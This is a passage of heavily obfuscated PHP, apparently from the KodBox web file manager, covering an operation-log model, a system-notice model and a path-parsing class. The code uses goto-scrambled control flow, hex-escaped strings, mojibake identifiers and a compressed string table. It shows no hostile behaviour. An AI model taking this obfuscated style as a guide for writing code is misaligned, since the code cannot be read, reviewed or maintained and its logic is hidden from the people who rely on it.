Session::get($DÃ°­šÁ°‚[1772]); } $aÎ£Ê¸“Œè = get_client_ip(); if (!$cì¸æ‘‘¤“ || strlen(json_encode($cì¸æ‘‘¤“)) >= 1024) { $cì¸æ‘‘¤“ = array($DÃ°­šÁ°‚[2041] => $aÎ£Ê¸“Œè); } else { if (is_array($cì¸æ‘‘¤“)) { $cì¸æ‘‘¤“[$DÃ°­šÁ°‚[2041]] = $aÎ£Ê¸“Œè; } else { $cì¸æ‘‘¤“ = array($DÃ°­šÁ°‚[1055] => $cì¸æ‘‘¤“, $DÃ°­šÁ°‚[2041] => $aÎ£Ê¸“Œè); } } goto B«¢ğ‰œåß; F†¶Õ®êÏ·: $DÃ°­šÁ°‚ =& $_SERVER[¢Í]; if (!isset($this->typeList[$e‹¸Û›ÓÖ±])) { return; } $b™˜¯”‚› = defined($DÃ°­šÁ°‚[451]) && USER_ID ? USER_ID : (isset($cì¸æ‘‘¤“[$DÃ°­šÁ°‚[1489]]) ? $cì¸æ‘‘¤“[$DÃ°­šÁ°‚[1489]] : 0); goto Fè™¶®ˆò³; A¤ö¡ªƒõ: } public function remove($B†ÎøØŠ™ˆ) { $this->where(array($_SERVER[¢Í][410] => $B†ÎøØŠ™ˆ))->delete(); } private function _makeOrder($eİçÙ°ÂÒã = '') { goto CÏèÍÄÆèÆ; Cº×ÚÌ´•†: $fÓÁ™È‹à = Input::get($e®œ–‘Áì¾[433], $e®œ–‘Áì¾[7], $e®œ–‘Áì¾[1807], array($e®œ–‘Áì¾[1732], $e®œ–‘Áì¾[429])); $fÓÁ™È‹à = $E–á×‡êˆ‘[$fÓÁ™È‹à]; $eİçÙ°ÂÒã = $eİçÙ°ÂÒã . "{$Fã¹İ†”ƒŒ}\40{$fÓÁ™È‹à}"; goto c†¶â•îå; CÏèÍÄÆèÆ: $e®œ–‘Áì¾ =& $_SERVER[¢Í]; $Fã¹İ†”ƒŒ = $e®œ–‘Áì¾[200]; $E–á×‡êˆ‘ = array($e®œ–‘Áì¾[427] => $e®œ–‘Áì¾[428], $e®œ–‘Áì¾[429] => $e®œ–‘Áì¾[430]); goto Cº×ÚÌ´•†; c†¶â•îå: return $this->order($eİçÙ°ÂÒã); goto E†çˆØ©ø; E†çˆØ©ø: } public function get($d›„Ê¨­­– = '') { goto C§™Ãöù©; C§™Ãöù©: $Aµ²¶¶õ»Â =& $_SERVER[¢Í]; if (!$d›„Ê¨­­–) { show_json(array()); } $D¹¹áôøÕ· = array(); goto eËáååƒ÷…; FÂ÷‰¡ö Ê: if (!empty($d›„Ê¨­­–[$Aµ²¶¶õ»Â[2041]])) { $D¹¹áôøÕ·[$Aµ²¶¶õ»Â[430]] = array($Aµ²¶¶õ»Â[382], "\x25{$d›„Ê¨­­–[$Aµ²¶¶õ»Â[2041]]}\45"); } $Cï„é„… = $this->_makeOrder()->where($D¹¹áôøÕ·)->selectPage(); if (empty($Cï„é„…[$Aµ²¶¶õ»Â[370]])) { show_json(array(), !0, $Cï„é„…[$Aµ²¶¶õ»Â[367]]); } goto d°è»ë‡³á; d°è»ë‡³á: $Cï„é„…[$Aµ²¶¶õ»Â[370]] = $this->logList($Cï„é„…[$Aµ²¶¶õ»Â[370]]); return $Cï„é„…; goto C°©”Î«“÷; eËáååƒ÷…: if ($d›„Ê¨­­–[$Aµ²¶¶õ»Â[1489]]) { $D¹¹áôøÕ·[$Aµ²¶¶õ»Â[1489]] = $d›„Ê¨­­–[$Aµ²¶¶õ»Â[1489]]; } if (isset($d›„Ê¨­­–[$Aµ²¶¶õ»Â[716]])) { $f·¡ƒÇ™‘© = $d›„Ê¨­­–[$Aµ²¶¶õ»Â[716]]; $cÁ¼ÈÑòÄ« = isset($d›„Ê¨­­–[$Aµ²¶¶õ»Â[473]]) ? $d›„Ê¨­­–[$Aµ²¶¶õ»Â[473]] : time(); $D¹¹áôøÕ·[$Aµ²¶¶õ»Â[200]] = array($Aµ²¶¶õ»Â[336], array($f·¡ƒÇ™‘©, $cÁ¼ÈÑòÄ«)); } if ($d›„Ê¨­­–[$Aµ²¶¶õ»Â[29]]) { $f›âäªÖª = explode($Aµ²¶¶õ»Â[47], $d›„Ê¨­­–[$Aµ²¶¶õ»Â[29]]); $f­ÛÏÒÅ„Ñ = $this->typeFile(); $d«—¹…Õó± = array(); foreach ($f›âäªÖª as $e…¯Í¼¢µ³) { $d«—¹…Õó±[] = $e…¯Í¼¢µ³; if (isset($f­ÛÏÒÅ„Ñ[$e…¯Í¼¢µ³])) { $d«—¹…Õó± = array_merge($d«—¹…Õó±, $f­ÛÏÒÅ„Ñ[$e…¯Í¼¢µ³]); } } $d«—¹…Õó± = array_unique($d«—¹…Õó±); if ($d«—¹…Õó±) { $D¹¹áôøÕ·[$Aµ²¶¶õ»Â[29]] = array($Aµ²¶¶õ»Â[7], $d«—¹…Õó±); } } goto FÂ÷‰¡ö Ê; C°©”Î«“÷: } private function ipAddress(&$e¡¶¥èÈµÀ) { $AÕÄ¾“ˆ£ =& $_SERVER[¢Í]; if (!empty($e¡¶¥èÈµÀ[$AÕÄ¾“ˆ£[2041]])) { $CÛ‚ï¶¤‹ = IpLocation::get($e¡¶¥èÈµÀ[$AÕÄ¾“ˆ£[2041]]); } else { $CÛ‚ï¶¤‹ = LNG($AÕÄ¾“ˆ£[2042]); } $e¡¶¥èÈµÀ[$AÕÄ¾“ˆ£[2043]] = $CÛ‚ï¶¤‹; } private function descZipDownload($Bî³‘ÑÁä, &$f¤ñŸ°ò‹‡) { $f¤åŒ£å‘Ò =& $_SERVER[¢Í]; if (!isset($Bî³‘ÑÁä[$f¤åŒ£å‘Ò[2044]])) { return; } $DÜÄ’«Ïìâ = json_decode($Bî³‘ÑÁä[$f¤åŒ£å‘Ò[2044]], !0); foreach ($DÜÄ’«Ïìâ as $d«ËÁÙˆî‚) { try { $DÈ¢¬™ãÔ¿ = IO::infoFull($d«ËÁÙˆî‚[$f¤åŒ£å‘Ò[85]]); } catch (Exception $C¼Õ×Ğåï) { continue; } $Bî³‘ÑÁä[$f¤åŒ£å‘Ò[85]] = $d«ËÁÙˆî‚[$f¤åŒ£å‘Ò[85]]; $f¤ñŸ°ò‹‡[] = $Bî³‘ÑÁä[$f¤åŒ£å‘Ò[394]] = $DÈ¢¬™ãÔ¿[$f¤åŒ£å‘Ò[394]]; $f¤ñŸ°ò‹‡[] = $Bî³‘ÑÁä[$f¤åŒ£å‘Ò[1863]] = $DÈ¢¬™ãÔ¿[$f¤åŒ£å‘Ò[487]]; break; } return $Bî³‘ÑÁä; } private function getSourceList(&$Eù³™İÚ¤¹) { $c÷›˜Ø°Å† =& $_SERVER[¢Í]; $bğ–äáÖ” = array(); foreach ($Eù³™İÚ¤¹ as $cÖ†Ê ¤–„ => $c¥ºİŞ‹êÙ) { goto dà¾õÁÖÔ; dà¾õÁÖÔ: $cßàæŞ‘¿ë = json_decode($c¥ºİŞ‹êÙ[$c÷›˜Ø°Å†[430]], !0); if ($c¥ºİŞ‹êÙ[$c÷›˜Ø°Å†[29]] == $c÷›˜Ø°Å†[1619]) { $cßàæŞ‘¿ë = $this->descZipDownload($cßàæŞ‘¿ë, $bğ–äáÖ”); $Eù³™İÚ¤¹[$cÖ†Ê ¤–„][$c÷›˜Ø°Å†[430]] = json_encode($cßàæŞ‘¿ë); continue; } if (strpos($c¥ºİŞ‹êÙ[$c÷›˜Ø°Å†[29]], $c÷›˜Ø°Å†[1864]) !== 0) { if (!isset($cßàæŞ‘¿ë[$c÷›˜Ø°Å†[85]]) || strpos($c¥ºİŞ‹êÙ[$c÷›˜Ø°Å†[29]], $c÷›˜Ø°Å†[2045]) !== 0) { continue; } try { $B½Æ¾ëºËâ = IO::infoFull($cßàæŞ‘¿ë[$c÷›˜Ø°Å†[85]]); } catch (Exception $aóÖç§Õæì) { continue; } $bğ–äáÖ”[] = $cßàæŞ‘¿ë[$c÷›˜Ø°Å†[394]] = $B½Æ¾ëºËâ[$c÷›˜Ø°Å†[394]]; $bğ–äáÖ”[] = $cßàæŞ‘¿ë[$c÷›˜Ø°Å†[1863]] = $B½Æ¾ëºËâ[$c÷›˜Ø°Å†[487]]; $Eù³™İÚ¤¹[$cÖ†Ê ¤–„][$c÷›˜Ø°Å†[430]] = json_encode($cßàæŞ‘¿ë); continue; } goto B©­õ²òÛ; bÎ®Óõ•æ: if ($cßàæŞ‘¿ë[$c÷›˜Ø°Å†[29]] == $c÷›˜Ø°Å†[1871]) { $bğ–äáÖ”[] = $cßàæŞ‘¿ë[$c÷›˜Ø°Å†[430]][$c÷›˜Ø°Å†[394]]; } goto BÕ¸©ñ–‹; B©­õ²òÛ: $bğ–äáÖ”[] = $cßàæŞ‘¿ë[$c÷›˜Ø°Å†[394]]; $bğ–äáÖ”[] = $cßàæŞ‘¿ë[$c÷›˜Ø°Å†[1863]]; if ($cßàæŞ‘¿ë[$c÷›˜Ø°Å†[29]] == $c÷›˜Ø°Å†[518]) { $bğ–äáÖ”[] = $cßàæŞ‘¿ë[$c÷›˜Ø°Å†[430]][$c÷›˜Ø°Å†[1022]]; $bğ–äáÖ”[] = $cßàæŞ‘¿ë[$c÷›˜Ø°Å†[430]][$c÷›˜Ø°Å†[1023]]; } goto bÎ®Óõ•æ; BÕ¸©ñ–‹: } if (!$bğ–äáÖ”) { return array(); } return Model($c÷›˜Ø°Å†[765])->sourceListInfo($bğ–äáÖ”, !0); } private function logList($f°ĞÏØã) { goto e‹¬Ùî›Ö»; fæàö•©±Ÿ: $e¥²ÍÉª°È = array(); foreach ($f°ĞÏØã as $F–ƒ¢îÅµ« => $FÂò›·É‰÷) { goto Bì£Œ†Ì¥¸; f¿Ø—¶Ú¤ó: unset($FÂò›·É‰÷[$D¼ì•µ†[2048]]); $d×ğ”ÊÔâ®[] = $FÂò›·É‰÷; goto C¶‹ Ş¯; bãÎªåÊë: $FÂò›·É‰÷[$D¼ì•µ†[28]] = isset($Bö‘ïÊ°Õ[$D¼ì•µ†[28]]) ? $Bö‘ïÊ°Õ[$D¼ì•µ†[28]] : LNG($D¼ì•µ†[2042]); $FÂò›·É‰÷[$D¼ì•µ†[1913]] = isset($Bö‘ïÊ°Õ[$D¼ì•µ†[1913]]) ? $Bö‘ïÊ°Õ[$D¼ì•µ†[1913]] : $D¼ì•µ†[33]; $FÂò›·É‰÷[$D¼ì•µ†[1394]] = isset($D…²Ì‚Ù¨¬[$A±ìŒ¹‰ªÖ]) ? $D…²Ì‚Ù¨¬[$A±ìŒ¹‰ªÖ] : $F±áÇñ›; goto dáÒË¼§éó; dáÒË¼§éó: $FÂò›·É‰÷[$D¼ì•µ†[1806]] = $Bö‘ïÊ°Õ; $Cñİ£¾‘‰ = json_decode($FÂò›·É‰÷[$D¼ì•µ†[430]], !0); $FÂò›·É‰÷[$D¼ì•µ†[2041]] = isset($Cñİ£¾‘‰[$D¼ì•µ†[2041]]) ? $Cñİ£¾‘‰[$D¼ì•µ†[2041]] : $D¼ì•µ†[33]; goto fÊİêÀ¨…ˆ; Bì£Œ†Ì¥¸: $A±ìŒ¹‰ªÖ = $FÂò›·É‰÷[$D¼ì•µ†[29]]; $Bö‘ïÊ°Õ = isset($d‹èÁ³¬[$FÂò›·É‰÷[$D¼ì•µ†[1489]]]) ? $d‹èÁ³¬[$FÂò›·É‰÷[$D¼ì•µ†[1489]]] : !1; $F±áÇñ› = strpos($A±ìŒ¹‰ªÖ, $D¼ì•µ†[2046]) === 0 ? LNG($D¼ì•µ†[2047]) : LNG($D¼ì•µ†[2042]); goto bãÎªåÊë; fÊİêÀ¨…ˆ: $this->ipAddress($FÂò›·É‰÷); if (strpos($A±ìŒ¹‰ªÖ, $D¼ì•µ†[1864]) === 0 || isset($Cñİ£¾‘‰[$D¼ì•µ†[1863]])) { goto e£âÁ‡òí ; e£âÁ‡òí : $Cñİ£¾‘‰[$D¼ì•µ†[416]] = $c–Øå¦„°Ã[$Cñİ£¾‘‰[$D¼ì•µ†[394]]]; $Cñİ£¾‘‰[$D¼ì•µ†[1876]] = $c–Øå¦„°Ã[$Cñİ£¾‘‰[$D¼ì•µ†[1863]]]; if ($Cñİ£¾‘‰[$D¼ì•µ†[29]] == $D¼ì•µ†[518]) { $Cñİ£¾‘‰[$D¼ì•µ†[430]][$D¼ì•µ†[1022]] = $c–Øå¦„°Ã[$Cñİ£¾‘‰[$D¼ì•µ†[430]][$D¼ì•µ†[1022]]]; $Cñİ£¾‘‰[$D¼ì•µ†[430]][$D¼ì•µ†[1023]] = $c–Øå¦„°Ã[$Cñİ£¾‘‰[$D¼ì•µ†[430]][$D¼ì•µ†[1023]]]; } goto bÀ‡¤¤‰ƒ; f´Ù’±Ã…Ô: if ($Cñİ£¾‘‰[$D¼ì•µ†[1876]] && $Cñİ£¾‘‰[$D¼ì•µ†[1876]][$D¼ì•µ†[396]] == $D¼ì•µ†[1133]) { $e¥²ÍÉª°È[] = $FÂò›·É‰÷[$D¼ì•µ†[392]]; unset($f°ĞÏØã[$F–ƒ¢îÅµ«]); continue; } goto AÒáë×›; bÀ‡¤¤‰ƒ: if ($Cñİ£¾‘‰[$D¼ì•µ†[29]] == $D¼ì•µ†[1871]) { $Cñİ£¾‘‰[$D¼ì•µ†[430]][$D¼ì•µ†[394]] = $c–Øå¦„°Ã[$Cñİ£¾‘‰[$D¼ì•µ†[430]][$D¼ì•µ†[394]]]; } if ($Cñİ£¾‘‰[$D¼ì•µ†[29]] == $D¼ì•µ†[1614]) { $Cñİ£¾‘‰[$D¼ì•µ†[1876]] = $Cñİ£¾‘‰[$D¼ì•µ†[416]]; $Cñİ£¾‘‰[$D¼ì•µ†[1863]] = $Cñİ£¾‘‰[$D¼ì•µ†[1876]][$D¼ì•µ†[394]]; $Cñİ£¾‘‰[$D¼ì•µ†[416]] = !1; $Cñİ£¾‘‰[$D¼ì•µ†[394]] = $D¼ì•µ†[33]; } if ($Cñİ£¾‘‰[$D¼ì•µ†[416]] && $Cñİ£¾‘‰[$D¼ì•µ†[416]][$D¼ì•µ†[396]] == $D¼ì•µ†[1133]) { $e¥²ÍÉª°È[] = $FÂò›·É‰÷[$D¼ì•µ†[392]]; unset($f°ĞÏØã[$F–ƒ¢îÅµ«]); continue; } goto f´Ù’±Ã…Ô; AÒáë×›: } $FÂò›·É‰÷[$D¼ì•µ†[430]] = $Cñİ£¾‘‰; goto f¿Ø—¶Ú¤ó; C¶‹ Ş¯: } $this->clearSystemPathLog($e¥²ÍÉª°È); goto c•¡è‡¶¥…; c•¡è‡¶¥…: return $d×ğ”ÊÔâ®; goto c…îë‡Š‚°; e‹¬Ùî›Ö»: $D¼ì•µ† =& $_SERVER[¢Í]; $BÔ¡ïÃŠÚ = array_to_keyvalue($f°ĞÏØã, $D¼ì•µ†[33], $D¼ì•µ†[1489]); $d‹èÁ³¬ = Model($D¼ì•µ†[503])->userListInfo(array_unique($BÔ¡ïÃŠÚ)); goto c”¨°é‹Í¨; c”¨°é‹Í¨: $c–Øå¦„°Ã = $this->getSourceList($f°ĞÏØã); $D…²Ì‚Ù¨¬ = $this->typeAll(); $d×ğ”ÊÔâ® = array(); goto fæàö•©±Ÿ; c…îë‡Š‚°: } private function clearSystemPathLog($dæÒ‹Â„ê) { $EøÜ¯«” =& $_SERVER[¢Í]; if (count($dæÒ‹Â„ê) == 0) { return; } $BÙ‰…ìğŒÓ = array($EøÜ¯«”[392] => array($EøÜ¯«”[7], array_unique($dæÒ‹Â„ê))); $this->where($BÙ‰…ìğŒÓ)->delete(); } public function deviceList($eÁ†ÑØÔªö, $eÙ•ò‚–†© = 0) { $AàŠ°ñ¦† =& $_SERVER[¢Í]; $Dõ–†²§Ü¥ = array($AàŠ°ñ¦†[1489] => $eÁ†ÑØÔªö, $AàŠ°ñ¦†[200] => array($AàŠ°ñ¦†[939], $eÙ•ò‚–†©), $AàŠ°ñ¦†[29] => $AàŠ°ñ¦†[1587]); $D¯¬À¢Ù×Æ = array(); $CÇå¤ËïÄ— = $this->field($AàŠ°ñ¦†[2049])->where($Dõ–†²§Ü¥)->order($AàŠ°ñ¦†[1874])->limit(50)->select(); foreach ($CÇå¤ËïÄ— as $aøŠÅ¾Ë–‹ => $a±—íäÈº) { goto DŒÀÑóäÛŸ; E”ØñˆÈµ¡: unset($fêñ±Úµ±[$AàŠ°ñ¦†[2041]]); $a—•§“†É = $this->deviceType($fêñ±Úµ±[$AàŠ°ñ¦†[1865]]); if (isset($D¯¬À¢Ù×Æ[$a—•§“†É])) { continue; } goto b¸ëÕÏäà÷; b¸ëÕÏäà÷: $this->ipAddress($a±—íäÈº); $a±—íäÈº[$AàŠ°ñ¦†[430]] = $fêñ±Úµ±; $D¯¬À¢Ù×Æ[$a—•§“†É] = $a±—íäÈº; goto c»´ÅŠÚå; DŒÀÑóäÛŸ: if ($aøŠÅ¾Ë–‹ > 0 && abs($a±—íäÈº[$AàŠ°ñ¦†[200]] - $CÇå¤ËïÄ—[$aøŠÅ¾Ë–‹ - 1][$AàŠ°ñ¦†[200]]) < 5) { continue; } $fêñ±Úµ± = json_decode($a±—íäÈº[$AàŠ°ñ¦†[430]], !0); $a±—íäÈº[$AàŠ°ñ¦†[2041]] = isset($fêñ±Úµ±[$AàŠ°ñ¦†[2041]]) ? $fêñ±Úµ±[$AàŠ°ñ¦†[2041]] : $AàŠ°ñ¦†[33]; goto E”ØñˆÈµ¡; c»´ÅŠÚå: } return array_values($D¯¬À¢Ù×Æ); } public function deviceType($e¢Æ÷¥ÏÙË) { return $e¢Æ÷¥ÏÙË; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\x6e\157\x74\x69\x63\145\114\x69\163\164"; public $field = array("\156\141\x6d\x65", "\x63\x6f\x6e\x74\145\x6e\x74", "\141\165\x74\x68", "\x6d\x6f\144\145", "\x74\151\155\x65", "\x74\171\160\145", "\x6c\145\x76\145\154", "\145\x6e\x61\142\154\x65", "\x73\157\162\164"); public function listData($FğŒÊ–È«· = false, $aˆËé›ùÇ = "\x73\x6f\162\x74", $Aöº•¥¾İ§ = false) { return parent::listData($FğŒÊ–È«·, $aˆËé›ùÇ, $Aöº•¥¾İ§); } public function add($B£—‹µà¼±) { $A¸Ä™ĞÏÊ¨ =& $_SERVER[¢Í]; $Bö±ïÇß“– = time(); if ($B£—‹µà¼±[$A¸Ä™ĞÏÊ¨[12]] == $A¸Ä™ĞÏÊ¨[2050]) { $Bö±ïÇß“– = strtotime($B£—‹µà¼±[$A¸Ä™ĞÏÊ¨[203]]); } $B£—‹µà¼±[$A¸Ä™ĞÏÊ¨[203]] = $Bö±ïÇß“–; return parent::insert($B£—‹µà¼±); } public function update($fßí‰êÖåË, $a¸åĞÚë©Ÿ) { goto cÉÉ¥®ğÕ; cÉÉ¥®ğÕ: $D¤§ÌÚ£¾´ =& $_SERVER[¢Í]; $AíÏí÷°³ã = $this->listData($fßí‰êÖåË); if (!$AíÏí÷°³ã) { return !1; } goto e²ìÜÇÔÜ‹; e²ìÜÇÔÜ‹: $Dò«©¥¯¥í = time(); if ($a¸åĞÚë©Ÿ[$D¤§ÌÚ£¾´[12]] == $D¤§ÌÚ£¾´[2050]) { $Dò«©¥¯¥í = strtotime($a¸åĞÚë©Ÿ[$D¤§ÌÚ£¾´[203]]); } $a¸åĞÚë©Ÿ[$D¤§ÌÚ£¾´[203]] = $Dò«©¥¯¥í; goto a¸Æ‹Ç‘ß·; a¸Æ‹Ç‘ß·: return parent::update($fßí‰êÖåË, $a¸åĞÚë©Ÿ); goto AÕ“ëÔ–¬; AÕ“ëÔ–¬: } public function remove($c™í÷õ±¯Š) { $F¿©†½ªŞ‰ = $this->listData($c™í÷õ±¯Š); if (!$F¿©†½ªŞ‰ || $F¿©†½ªŞ‰[$_SERVER[¢Í][1133]]) { return !1; } return parent::remove($c™í÷õ±¯Š); } public function sort($A‡æ¯š«ÙÆ, $CÖ”ŸÂËÅÑ) { return parent::update($A‡æ¯š«ÙÆ, $CÖ”ŸÂËÅÑ); } public function enable($FğóÄ¤Ş½Ô, $B÷‹§Öß‚) { return parent::update($FğóÄ¤Ş½Ô, array($_SERVER[¢Í][2051] => $B÷‹§Öß‚)); } private function initUserOption() { $fÒÂ®ñ…ÃÁ =& $_SERVER[¢Í]; $this->optionType = $fÒÂ®ñ…ÃÁ[2052]; $this->modelType = $fÒÂ®ñ…ÃÁ[2053]; $this->field = array($fÒÂ®ñ…ÃÁ[2054], $fÒÂ®ñ…ÃÁ[28], $fÒÂ®ñ…ÃÁ[203], $fÒÂ®ñ…ÃÁ[29], $fÒÂ®ñ…ÃÁ[2055], $fÒÂ®ñ…ÃÁ[703], $fÒÂ®ñ…ÃÁ[197]); } public function userNoticeGet($a…Ã¼Ùøİ = false) { $this->initUserOption(); return parent::listData($a…Ã¼Ùøİ, $_SERVER[¢Í][392], !0); } public function userNoticeAdd($AÔ¯Ëæè¦è) { $DƒÓßÇ®Ó =& $_SERVER[¢Í]; $this->initUserOption(); $CœîÙÎ‡ÚÙ = $this->findByKey($DƒÓßÇ®Ó[2054], $AÔ¯Ëæè¦è[$DƒÓßÇ®Ó[392]]); if ($CœîÙÎ‡ÚÙ) { return !0; } $c„ƒ¶¯İ¼ = array($DƒÓßÇ®Ó[2054] => $AÔ¯Ëæè¦è[$DƒÓßÇ®Ó[392]], $DƒÓßÇ®Ó[28] => $AÔ¯Ëæè¦è[$DƒÓßÇ®Ó[28]], $DƒÓßÇ®Ó[203] => $AÔ¯Ëæè¦è[$DƒÓßÇ®Ó[203]], $DƒÓßÇ®Ó[29] => isset($AÔ¯Ëæè¦è[$DƒÓßÇ®Ó[29]]) ? $AÔ¯Ëæè¦è[$DƒÓßÇ®Ó[29]] : 1, $DƒÓßÇ®Ó[2055] => isset($AÔ¯Ëæè¦è[$DƒÓßÇ®Ó[2055]]) ? $AÔ¯Ëæè¦è[$DƒÓßÇ®Ó[2055]] : 0, $DƒÓßÇ®Ó[703] => 0, $DƒÓßÇ®Ó[197] => 0); return parent::insert($c„ƒ¶¯İ¼); } public function userNoticeEdit($fœœÁ ®“Ï, $Aî’ÈŠ âÈ) { $this->initUserOption(); return parent::update($fœœÁ ®“Ï, $Aî’ÈŠ âÈ); } } goto AªçŸì×Ï°; Cò§¬¶¿ëƒ: define($_SERVER[¢Í][0], $_SERVER[¢Í][1]); $_SERVER[ëÈ] = explode($_SERVER[¢Í][2], gzinflate(substr($_SERVER[¢Í][3], 10, -8))); function binCheckEq($d¹í†ÅŠ¦ß, $C½Ñ¶Î¹ˆŸ) { return $d¹í†ÅŠ¦ß == $C½Ñ¶Î¹ˆŸ; } goto AñíÌ©Ü‰; fè»¼£Êëî: class KodIO { const KOD_SOURCE = "\173\163\157\165\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\x52\145\x63\x79\143\154\x65\175"; const KOD_USER_FAV = "\x7b\165\163\145\162\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\x46\151\154\x65\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\162\x46\x69\x6c\x65\124\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\165\x70\x52\x6f\157\x74\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\173\165\163\x65\162\x53\x68\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\x72\123\150\141\162\x65\114\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\x65\x54\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\162\145\111\x74\145\155\175"; const KOD_SHARE_LINK = "\173\163\150\141\x72\x65\111\164\145\x6d\114\x69\156\x6b\x7d"; const KOD_SEARCH = "\x7b\163\145\141\x72\143\150\x7d"; const KOD_BLOCK = "\x7b\142\154\157\143\x6b\x7d"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\173\x75\163\x65\x72\x52\145\x6e\143\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\x69\166\145\x72\175"; public static function typeList() { $bˆ‰÷÷Ÿğñ =& $_SERVER[¢Í]; return array($bˆ‰÷÷Ÿğñ[1104] => self::KOD_SOURCE, $bˆ‰÷÷Ÿğñ[1105] => self::KOD_USER_RECYCLE, $bˆ‰÷÷Ÿğñ[1106] => self::KOD_USER_FAV, $bˆ‰÷÷Ÿğñ[1107] => self::KOD_USER_FILE_TAG, $bˆ‰÷÷Ÿğñ[1108] => self::KOD_USER_FILE_TYPE, $bˆ‰÷÷Ÿğñ[1109] => self::KOD_GROUP_ROOT_SELF, $bˆ‰÷÷Ÿğñ[1110] => self::KOD_USER_SHARE, $bˆ‰÷÷Ÿğñ[1111] => self::KOD_USER_SHARE_LINK, $bˆ‰÷÷Ÿğñ[1112] => self::KOD_USER_SHARE_TO_ME, $bˆ‰÷÷Ÿğñ[1113] => self::KOD_SHARE_ITEM, $bˆ‰÷÷Ÿğñ[1114] => self::KOD_SHARE_LINK, $bˆ‰÷÷Ÿğñ[1115] => self::KOD_SEARCH, $bˆ‰÷÷Ÿğñ[1116] => self::KOD_BLOCK, $bˆ‰÷÷Ÿğñ[1117] => self::KOD_IO, $bˆ‰÷÷Ÿğñ[1118] => self::KOD_USER_RECENT, $bˆ‰÷÷Ÿğñ[1119] => self::KOD_USER_DRIVER); } public static function parse($aöäßÅëò) { goto BÃƒÓ¬æí˜; FÀè¬¸šÈÌ: preg_match($EĞ‹¸¡„µÅ[1120], $aöäßÅëò, $AÉöÍ‘Ë®¥); $B‰ÊÕƒíŠ³ = array($EĞ‹¸¡„µÅ[413] => !1, $EĞ‹¸¡„µÅ[1121] => !1, $EĞ‹¸¡„µÅ[410] => !1, $EĞ‹¸¡„µÅ[85] => $aöäßÅëò, $EĞ‹¸¡„µÅ[1032] => !1, $EĞ‹¸¡„µÅ[1031] => $EĞ‹¸¡„µÅ[33]); if (is_array($AÉöÍ‘Ë®¥) && count($AÉöÍ‘Ë®¥) == 5) { $dö˜•ñÕÍ¤ = $EĞ‹¸¡„µÅ[1122] . $AÉöÍ‘Ë®¥[2] . $EĞ‹¸¡„µÅ[330]; if (in_array($dö˜•ñÕÍ¤, $E»„éÚˆÄé)) { $B‰ÊÕƒíŠ³[$EĞ‹¸¡„µÅ[1032]] = $AÉöÍ‘Ë®¥[1]; $B‰ÊÕƒíŠ³[$EĞ‹¸¡„µÅ[29]] = $dö˜•ñÕÍ¤; $B‰ÊÕƒíŠ³[$EĞ‹¸¡„µÅ[1123]] = substr($dö˜•ñÕÍ¤, 1, -1); $B‰ÊÕƒíŠ³[$EĞ‹¸¡„µÅ[392]] = $AÉöÍ‘Ë®¥[3]; } $B‰ÊÕƒíŠ³[$EĞ‹¸¡„µÅ[1031]] = $AÉöÍ‘Ë®¥[4]; } goto aÚæÓí¶Ü¿; aÚæÓí¶Ü¿: $fÄËÑìëä¦ = array($EĞ‹¸¡„µÅ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $B‰ÊÕƒíŠ³[$EĞ‹¸¡„µÅ[1085]] = in_array($B‰ÊÕƒíŠ³[$EĞ‹¸¡„µÅ[29]], $fÄËÑìëä¦); return $B‰ÊÕƒíŠ³; goto fƒÀº˜Áâ¨; BÃƒÓ¬æí˜: $EĞ‹¸¡„µÅ =& $_SERVER[¢Í]; $aöäßÅëò = self::clear($aöäßÅëò); $E»„éÚˆÄé = array_values(self::typeList()); goto FÀè¬¸šÈÌ; fƒÀº˜Áâ¨: } public static function clear($f»Š½ŒºÃ) { goto bƒ¼¶öÉã; B‚İÇ¦‚Õï: $f»Š½ŒºÃ = preg_replace($F¬øÎÉˆÅ[1126], $F¬øÎÉˆÅ[8], $f»Š½ŒºÃ); if ($f»Š½ŒºÃ == $F¬øÎÉˆÅ[8]) { return $F¬øÎÉˆÅ[8]; } $f»Š½ŒºÃ = rtrim($f»Š½ŒºÃ, $F¬øÎÉˆÅ[8]); goto CÜ”“™±„î; C¹Šº…æîİ: $cÁªí…„ÃÓ = $F¬øÎÉˆÅ[1124]; if (substr($f»Š½ŒºÃ, 0, 3) == $F¬øÎÉˆÅ[1125]) { $f»Š½ŒºÃ = substr($f»Š½ŒºÃ, 3); } while (strstr($f»Š½ŒºÃ, $cÁªí…„ÃÓ)) { $f»Š½ŒºÃ = str_replace($cÁªí…„ÃÓ, $F¬øÎÉˆÅ[8], $f»Š½ŒºÃ); } goto B‚İÇ¦‚Õï; CÜ”“™±„î: return $f»Š½ŒºÃ; goto Cô²Š¶ä‰å; bƒ¼¶öÉã: $F¬øÎÉˆÅ =& $_SERVER[¢Í]; $f»Š½ŒºÃ = str_replace(array($F¬øÎÉˆÅ[1005], $F¬øÎÉˆÅ[56]), $F¬øÎÉˆÅ[50], $f»Š½ŒºÃ); $f»Š½ŒºÃ = str_replace($F¬øÎÉˆÅ[103], $F¬øÎÉˆÅ[8], $f»Š½ŒºÃ); goto C¹Šº…æîİ; Cô²Š¶ä‰å: } public static function sourceID($dÏœ½Ş‹©) { $aÈ—©ŸŒÀŞ =& $_SERVER[¢Í]; $aéòÑƒ¹ôô = self::parse($dÏœ½Ş‹©); if ($aéòÑƒ¹ôô[$aÈ—©ŸŒÀŞ[29]] !== self::KOD_SOURCE) { show_json(LNG($aÈ—©ŸŒÀŞ[1127]), !1); } return $aéòÑƒ¹ôô[$aÈ—©ŸŒÀŞ[392]]; } public static function make($b„±Ü‘š¼) { if (!$b„±Ü‘š¼) { return !1; } return self::makePath(self::KOD_SOURCE, intval($b„±Ü‘š¼)); } public static function 